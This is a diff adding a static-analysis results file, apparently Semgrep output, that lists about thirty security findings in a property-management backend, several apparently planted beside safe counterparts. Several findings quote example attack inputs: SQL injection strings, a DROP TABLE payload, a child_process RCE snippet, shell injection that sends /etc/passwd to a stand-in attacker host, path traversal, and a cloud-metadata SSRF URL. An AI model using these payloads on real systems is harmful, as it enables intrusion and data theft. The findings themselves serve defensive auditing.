@@ -1,0 +1,745 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "backend/src/routes/units.ts",
+      "start": {
+        "line": 45,
+        "col": 1,
+        "offset": 1489
+      },
+      "end": {
+        "line": 50,
+        "col": 2,
+        "offset": 1590
+      },
+      "extra": {
+        "message": "buildSavedSearchFilterClause() concatenates raw user-controlled query parameters (field names AND values) directly into a SQL string: `unit.${field} = '${value}'`. It is invoked in GET /api/units/saved-search via qb.andWhere(clause). Any authenticated user (including tenants) can inject arbitrary SQL (e.g. search=...; value=' OR '1'='1' OR 'x'='x) by crafting query parameters, enabling full SQL injection against the units table.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-orderby",
+      "path": "backend/src/routes/units.ts",
+      "start": {
+        "line": 126,
+        "col": 5,
+        "offset": 4027
+      },
+      "end": {
+        "line": 126,
+        "col": 72,
+        "offset": 4094
+      },
+      "extra": {
+        "message": "GET /api/units/saved-search builds the ORDER BY clause by interpolating the user-supplied 'sortBy' query parameter directly: qb.orderBy(`unit.${sortBy}`, 'ASC'). An attacker can set sortBy to something like \"unitNumber ASC, (SELECT ...)\" or use subquery/boolean-based payloads to inject into the ORDER BY context of the SQL query.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 99,
+        "col": 1,
+        "offset": 3463
+      },
+      "end": {
+        "line": 101,
+        "col": 4,
+        "offset": 3577
+      },
+      "extra": {
+        "message": "searchLeaseNotesByTerm() executes a raw SQL query with the user-supplied 'term' interpolated directly into the string: `... WHERE notes ILIKE '%${term}%'`. The term comes from GET /api/leases/notes-search?term= (query param). A property_admin/property_manager can break out of the literal with '%' and single quotes to read/modify arbitrary rows (e.g. stacked queries or UNION-based exfiltration). Note the sibling implementation searchTicketDescriptionsByTerm correctly uses a parameterized $1, confirming this is an injection flaw.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 34,
+        "col": 1,
+        "offset": 1120
+      },
+      "end": {
+        "line": 43,
+        "col": 2,
+        "offset": 1467
+      },
+      "extra": {
+        "message": "findPaymentsByLedgerCriteria() turns arbitrary reconciliation criteria (field names and values from the JSON request body) straight into SQL: `\"${field}\" = '${value}'` joined with AND and passed to AppDataSource.query(sql). POST /api/payments/ledger-reconciliation sends the raw body. A property_admin/property_manager can inject SQL through the values (or field names) of the criteria object (e.g. {\"x\":\"'; DROP TABLE payment_record;--\"}), compromising the whole DB.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 34,
+        "col": 1,
+        "offset": 1157
+      },
+      "end": {
+        "line": 37,
+        "col": 2,
+        "offset": 1394
+      },
+      "extra": {
+        "message": "evaluateMoveOutProrationFormula() compiles attacker-controlled arithmetic into executable code: `new Function('params', 'return (' + formula + ')')`. The formula comes from the multipart field prorationFormula in POST /api/leases/:id/moveout-worksheet (only the presence of a string is checked). A property_admin/property_manager can supply arbitrary JavaScript (e.g. `process.mainModule.require('child_process').execSync('id')`) achieving Remote Code Execution on the server. The adjacent /moveout-worksheet-standard endpoint shows the intended allowlist design.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "backend/src/routes/messages.ts",
+      "start": {
+        "line": 21,
+        "col": 3,
+        "offset": 642
+      },
+      "end": {
+        "line": 21,
+        "col": 111,
+        "offset": 750
+      },
+      "extra": {
+        "message": "renderCorrespondencePacket() runs execSync with unsanitized values interpolated into a shell string: `pandoc ${sourceMarkdownPath} -o ${outFile} --pdf-engine-opt=${paperProfile}`. paperProfile is read verbatim from the 'x-mailroom-paper-profile' request header and sourceMarkdownPath embeds the route :id parameter. POST /api/messages/notices/:id/print-packet lets a property_admin/property_manager (or anyone able to influence the header) inject shell metacharacters (e.g. `--pdf-engine-opt=letter; curl attacker; #`) \u2192 OS command injection. The leases.ts pandoc variant correctly uses spawn() with an argument array and an allowlist, proving this is a bug.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "backend/src/routes/importExport.ts",
+      "start": {
+        "line": 296,
+        "col": 5,
+        "offset": 9516
+      },
+      "end": {
+        "line": 303,
+        "col": 6,
+        "offset": 9874
+      },
+      "extra": {
+        "message": "GET /api/export/maintenance/rendered takes 'preset' from the reportPreset cookie or the query string, embeds it in `./scripts/render-report.sh maintenance ${preset} ${outFile}`, and executes it via spawn('bash', ['-c', cmd], {shell:true}). The preset value is never validated or escaped (contrast with buildInspectionsReportArgs which allowlists the template), so a property_admin/property_manager can inject arbitrary shell commands (e.g. preset=`standard; curl http://attacker/$(cat /etc/passwd); #`).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.jwt-not-verified",
+      "path": "backend/src/routes/dispatch.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 360
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 520
+      },
+      "extra": {
+        "message": "resolveDispatchBrief() uses app.jwt.decode() instead of app.jwt.verify(), so the token signature and expiry are never checked - only base64-decoded. The /dispatch/:token endpoints (GET :token, POST :token/queue, POST :token/materials-receipt, POST :token/complete) are public (not under /api/) and accept any attacker-forged JWT payload. Consequences: (1) GET /dispatch/:token discloses any ticket's description/building address; (2) POST /dispatch/:token/queue lets an unauthenticated attacker list ALL maintenance tickets using arbitrary filter criteria (findDispatchQueueByCriteria passes the body straight into the TypeORM where clause); (3) POST /dispatch/:token/complete flips any ticket to 'completed' and overwrites resolutionNotes; (4) POST /dispatch/:token/materials-receipt writes files. No signature verification = total loss of integrity/confidentiality on these flows (CWE-347/CWE-287).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.hardcoded-role-register",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 60,
+        "col": 7,
+        "offset": 1981
+      },
+      "end": {
+        "line": 60,
+        "col": 25,
+        "offset": 1999
+      },
+      "extra": {
+        "message": "The public POST /api/auth/register endpoint (no auth required) accepts a 'role' value straight from the request body and assigns it to the new account (`role: role || 'tenant'`). An unauthenticated attacker can register with role='property_admin' and immediately obtain a signed JWT granting full administrative access (all admin-only routes, tax records, user management, etc.). Registration must never allow the client to choose a privileged role.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-284: Improper Access Control",
+            "CWE-287: Improper Authentication",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment",
+      "path": "backend/src/routes/notifications.ts",
+      "start": {
+        "line": 95,
+        "col": 5,
+        "offset": 3262
+      },
+      "end": {
+        "line": 97,
+        "col": 6,
+        "offset": 3372
+      },
+      "extra": {
+        "message": "POST /api/notifications/device-sync/restore JSON.parses the attacker-controlled 'mobileSyncSnapshot' cookie and merges every property into the User entity via mergeDeviceSyncSnapshot (Object.assign(user, snapshot)) then saves it. A low-privileged user (e.g. tenant) can set the cookie to {\"role\":\"property_admin\",\"isActive\":true} and escalate their own account to admin (role column accepts that enum value), or overwrite passwordHash/email to fully hijack the account. The /restore-verified twin endpoint shows the intended fix: a strict zod allowlist of {phone, avatarUrl}. CWE-862/269 privilege escalation via mass assignment.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-269: Improper Privilege Management",
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-password-overwrite",
+      "path": "backend/src/routes/users.ts",
+      "start": {
+        "line": 116,
+        "col": 1,
+        "offset": 3625
+      },
+      "end": {
+        "line": 126,
+        "col": 2,
+        "offset": 4052
+      },
+      "extra": {
+        "message": "POST /api/users/:id/vendor-portal-access and POST /api/users/:id/worker-app-pin allow any property_admin OR property_manager to overwrite the passwordHash of ANY user id (e.g. another manager, an admin, or a tenant outside their assigned buildings). Unlike GET /api/users/:id which gates access with managerCanAccessUser(), these write endpoints perform NO building/portfolio scope check. A scoped manager can reset the bcrypt credential of any user via worker-app-pin (bcrypt hash) and then log in as that user (account takeover), or brick accounts by storing a non-bcrypt sha256 hex as passwordHash (vendor-portal-access). CWE-862 broken function-level authorization.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-620: Unverified Password Change"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-building-scope",
+      "path": "backend/src/routes/buildings.ts",
+      "start": {
+        "line": 182,
+        "col": 1,
+        "offset": 5686
+      },
+      "end": {
+        "line": 192,
+        "col": 2,
+        "offset": 6142
+      },
+      "extra": {
+        "message": "PATCH /api/buildings/:id/escalation-profile only requires the property_manager role but never calls managerCanAccessBuilding(), unlike PATCH /api/buildings/:id (line 167) and PATCH /api/units/:id which enforce building-level scope. A property_manager assigned to one building can modify the escalation profile (noise/quiet-hours/notify channels used by dispatch automation) of every building in the portfolio. CWE-862 missing authorization check.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-building-scope",
+      "path": "backend/src/routes/units.ts",
+      "start": {
+        "line": 217,
+        "col": 1,
+        "offset": 6657
+      },
+      "end": {
+        "line": 225,
+        "col": 2,
+        "offset": 7069
+      },
+      "extra": {
+        "message": "POST /api/units/:id/listing-sync performs NO managerCanAccessBuilding() check (the sibling PATCH /api/units/:id at line 209 does), and applyListingSyncPayload() does Object.assign(unit, payload) with the whole request body (mass assignment). A property_manager can therefore rewrite any field of any unit across the portfolio - including buildingId, rentAmount, status, description - and no validation restricts which properties the payload may touch. CWE-862 broken access control combined with mass assignment.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 257,
+        "col": 1,
+        "offset": 8715
+      },
+      "end": {
+        "line": 266,
+        "col": 2,
+        "offset": 9096
+      },
+      "extra": {
+        "message": "POST /api/leases/:id/move-out-notice never verifies that the authenticated tenant owns the lease (contrast with /api/tickets/:id/reschedule-request which explicitly checks ownership, and the code comment on tickets.ts:263 that calls this out). Any authenticated user - including any tenant - can submit a move-out notice for an arbitrary lease id, writing attacker-controlled text (moveOutDate/reason) into that lease's notes field. CWE-639 IDOR write.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-authz",
+      "path": "backend/src/routes/tickets.ts",
+      "start": {
+        "line": 187,
+        "col": 1,
+        "offset": 6320
+      },
+      "end": {
+        "line": 193,
+        "col": 2,
+        "offset": 6654
+      },
+      "extra": {
+        "message": "GET /api/tickets/descriptions-search has NO role or ownership restriction and NO tenant/building scoping on the SQL it runs (searchTicketDescriptionsByTerm searches the whole maintenance_ticket table). Any authenticated tenant can query arbitrary search terms and read every other tenant's ticket titles and descriptions across all buildings. This is cross-tenant sensitive data disclosure (compare with the role-gated /api/leases/notes-search). CWE-862/CWE-200.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection",
+      "path": "backend/src/routes/buildings.ts",
+      "start": {
+        "line": 27,
+        "col": 5,
+        "offset": 761
+      },
+      "end": {
+        "line": 27,
+        "col": 120,
+        "offset": 876
+      },
+      "extra": {
+        "message": "findAmenityMatchesUnsafe() builds an XPath expression by interpolating the amenity search string directly: `//amenity[@name='${amenityName}'] | //amenity[contains(@tags, '${amenityName}')]`. The value replayed here is the attacker-controlled amenityName previously stored via POST /api/buildings/:id/amenities/search-preference (recordAmenityQuery) and served back through GET /api/buildings/:id/amenities/quick-view. An authenticated attacker can break out of the string literal to alter the query and extract attributes/nodes from the building's XML document that should not be returned (e.g. `x'] | //amenity/@* | //amenity[@name='x`). findAmenityMatchesSafely() demonstrates the escaping fix. CWE-643 XPath injection.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "backend/src/services/directory.ts",
+      "start": {
+        "line": 23,
+        "col": 3,
+        "offset": 641
+      },
+      "end": {
+        "line": 23,
+        "col": 73,
+        "offset": 711
+      },
+      "extra": {
+        "message": "searchStaffDirectory() concatenates the raw search term into an LDAP filter: `(&(objectClass=person)(cn=*${term}*))` with no escaping (compare queryEmployeeDirectory which escapes via escapeLdapFilterValue). The term is user-supplied via GET /api/buildings/:id/onsite-staff?name=. An authenticated property_admin/property_manager can inject LDAP metacharacters (e.g. `*)(objectClass=*))(|(cn=*`) to broaden the filter and enumerate the entire corporate directory (names, emails, titles, departments). CWE-90 LDAP injection.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.write",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 78,
+        "col": 1,
+        "offset": 2673
+      },
+      "end": {
+        "line": 84,
+        "col": 2,
+        "offset": 2946
+      },
+      "extra": {
+        "message": "depositMoveOutPacketInTenantArchive() writes into `path.join(TENANT_ARCHIVE_ROOT, profile.userId, profile.moveOutPacketFolder || '.')` without validating that the folder stays under the tenant's workspace. moveOutPacketFolder is fully attacker-controlled: any tenant sets it on their own profile via PATCH /api/users/me/profile (users.ts line 229). Triggered through POST /api/leases/:id/move-out-packet, a tenant can set moveOutPacketFolder to something like '../../../../tmp/x' and write 'move-out-packet.pdf' to an arbitrary directory the process can write (path traversal write). depositMoveOutPacketInTenantArchiveSafely() shows the intended containment fix. CWE-22.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.read",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 41,
+        "col": 1,
+        "offset": 1290
+      },
+      "end": {
+        "line": 43,
+        "col": 2,
+        "offset": 1435
+      },
+      "extra": {
+        "message": "listRecordsRoomFolder() calls fs.readdirSync(path.join(RECORDS_ROOM_DIR, folder)) with the 'folder' route parameter taken verbatim from the URL. GET /api/documents/records-room/:folder lets an authenticated property_admin/property_manager supply ../../../../etc or any absolute-ish traversal segment and enumerate arbitrary server directories (file/dir names disclosed), escaping the intended records-room root. listRecordsRoomFolderSafely() (basename) shows the intended fix. CWE-22 path traversal.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.read",
+      "path": "backend/src/routes/importExport.ts",
+      "start": {
+        "line": 52,
+        "col": 1,
+        "offset": 1781
+      },
+      "end": {
+        "line": 55,
+        "col": 2,
+        "offset": 1966
+      },
+      "extra": {
+        "message": "loadReportTemplateSource() reads fs.readFileSync(path.join(REPORT_TEMPLATE_DIR, templateName)) where templateName is the raw URL parameter of GET /api/export/report-templates/:templateName/source. A property_admin/property_manager can request /api/export/report-templates/..%2f..%2f..%2fetc%2fpasswd/source (or similar) and read arbitrary files from the server filesystem (e.g. /etc/passwd, .env with JWT/DB secrets). loadReportTemplateSourceSafely() (realpath + prefix check) shows the intended fix. CWE-22 arbitrary file read.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.write",
+      "path": "backend/src/routes/dispatch.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 502
+      },
+      "end": {
+        "line": 24,
+        "col": 2,
+        "offset": 756
+      },
+      "extra": {
+        "message": "persistContractorReceiptFile() writes fs.writeFileSync(path.join(CONTRACTOR_RECEIPT_DIR, `${receiptLabel}.txt`), buffer) where receiptLabel comes from the request body of POST /dispatch/:token/materials-receipt. Because the dispatch token is not signature-verified (see dispatch decode finding), this is reachable unauthenticated. An attacker can set receiptLabel to ../../../../tmp/evil (or other paths) to write attacker-controlled file content to arbitrary locations (path traversal write). CWE-22.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect",
+      "path": "backend/src/routes/dispatch.ts",
+      "start": {
+        "line": 26,
+        "col": 1,
+        "offset": 765
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 930
+      },
+      "extra": {
+        "message": "resolveDispatchReturnDestination() returns the raw 'x-return-url' request header value, which is then passed verbatim to reply.redirect() in POST /dispatch/:token/complete (line 130). There is no allowlist or scheme/path validation, so an attacker who controls the header (or lures a contractor tablet to send a malicious header via the forged/leaked dispatch token) can turn the endpoint into an open redirect to an arbitrary external origin, which can be abused for phishing. CWE-601.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 54,
+        "col": 1,
+        "offset": 1795
+      },
+      "end": {
+        "line": 59,
+        "col": 2,
+        "offset": 2020
+      },
+      "extra": {
+        "message": "mirrorArchiveSourceFile() fetches an arbitrary sourceUrl supplied in the request body of POST /api/documents/import-from-source with no host/scheme allowlist and no redirect restriction. A property_admin/property_manager can point the server at internal-only hosts (http://169.254.169.254/latest/meta-data, http://localhost:3003, internal DB/admin services) and the response bytes are then written to the uploads folder and recorded in the DB - classic SSRF (the mirrorTrustedArchiveSourceFile variant shows the allowlist fix). CWE-918.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf",
+      "path": "backend/src/routes/importExport.ts",
+      "start": {
+        "line": 165,
+        "col": 1,
+        "offset": 5280
+      },
+      "end": {
+        "line": 192,
+        "col": 2,
+        "offset": 6226
+      },
+      "extra": {
+        "message": "POST /api/import/vacancy-syndication and POST /api/import/inspection-checklist-feed both perform an unvalidated server-side fetch of the user-supplied feedUrl (await fetch(feedUrl)) before parsing. No scheme/host allowlist or redirect handling exists, so a property_admin/property_manager can make the server request arbitrary internal URLs (cloud metadata, local services) - SSRF. CWE-918.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.stack-trace",
+      "path": "backend/src/routes/properties.ts",
+      "start": {
+        "line": 221,
+        "col": 5,
+        "offset": 7166
+      },
+      "end": {
+        "line": 224,
+        "col": 7,
+        "offset": 7337
+      },
+      "extra": {
+        "message": "GET /api/properties/:id/portfolio-summary?view=internal returns the raw error.message and error.stack (err.stack) to the client whenever the query throws. There is no role check on this route, so any authenticated user (including tenants) can pass view=internal to receive internal server error details / stack traces, which aid further attacks (CWE-209/200 information disclosure).",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.sensitive-logging",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 194,
+        "col": 5,
+        "offset": 6230
+      },
+      "end": {
+        "line": 194,
+        "col": 45,
+        "offset": 6270
+      },
+      "extra": {
+        "message": "GET /api/payments/reconcile logs the entire reconciliation query object (logReconciliationLookup(query, ...)) to the console, including the raw bank accountNumber and routingNumber supplied by the caller. These ACH routing/account numbers are highly sensitive and should never be written to logs. The reconcile-v2 sibling correctly logs only payment id/status. CWE-532 insertion of sensitive information into log file.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secret",
+      "path": "backend/src/index.ts",
+      "start": {
+        "line": 42,
+        "col": 3,
+        "offset": 1060
+      },
+      "end": {
+        "line": 42,
+        "col": 100,
+        "offset": 1157
+      },
+      "extra": {
+        "message": "The JWT plugin is registered with secret = process.env.JWT_SECRET || 'dev-jwt-secret'. If JWT_SECRET is not set in the deployment environment, the signing key is a publicly known constant ('dev-jwt-secret'), allowing anyone to forge valid admin JWTs and fully bypass authentication. A production deployment that forgets the env var is completely compromised. CWE-798 hardcoded credential.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-1188: Insecure Default Initialization of Resource"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secret",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 46,
+        "col": 3,
+        "offset": 1500
+      },
+      "end": {
+        "line": 46,
+        "col": 90,
+        "offset": 1587
+      },
+      "extra": {
+        "message": "reportPaymentToRentBureau() falls back to a hardcoded 'live'-looking API key when RENT_BUREAU_KEY is unset: `process.env.RENT_BUREAU_KEY || 'rb_live_9f3ac2b8e7d1a04c'`. A committed production credential would let anyone who reads the source impersonate the app to the bureau (or the value is a leaked secret that must be rotated). CWE-798.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.weak-randomness",
+      "path": "backend/src/services/portalAccessCodes.ts",
+      "start": {
+        "line": 14,
+        "col": 3,
+        "offset": 320
+      },
+      "end": {
+        "line": 14,
+        "col": 60,
+        "offset": 377
+      },
+      "extra": {
+        "message": "issuePortalResetCode() generates the 8-character password-reset code with Math.random() instead of a CSPRNG (crypto.randomInt/randomBytes is used everywhere else in this file). Math.random() is predictable, and the reset code is the only secret that lets POST /api/auth/reset-password/confirm change an account's password, so an attacker who can predict or brute-force the weak code can take over the account. CWE-338/CWE-330 use of cryptographically weak PRNG.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator",
+            "CWE-330: Use of Insufficiently Random Values"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
